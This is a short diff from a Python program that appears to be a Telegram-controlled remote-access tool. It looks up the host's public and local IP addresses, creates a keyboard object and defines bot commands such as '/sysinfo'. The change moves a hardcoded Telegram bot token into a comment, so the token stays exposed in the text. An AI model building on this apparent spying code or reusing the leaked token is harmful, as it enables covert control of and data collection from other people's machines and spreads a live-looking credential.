@@ -22,7 +22,7 @@ if check_internret():
     keyboard = Hub.Keyboard()
     ip = requests.get("https://api.ipify.org/").text
     local_ip = os.Get_IP()
-    token = "6622962602:AAERgZlXugMGZIA5vqkIpv5KKAAsDUrA6is" # write your token
+    token = BOT_TOKEN # 6622962602:AAERgZlXugMGZIA5vqkIpv5KKAAsDUrA6is
     id = TELEGRAM_ID
     commands = ["/check", 
                 "/sysinfo", 
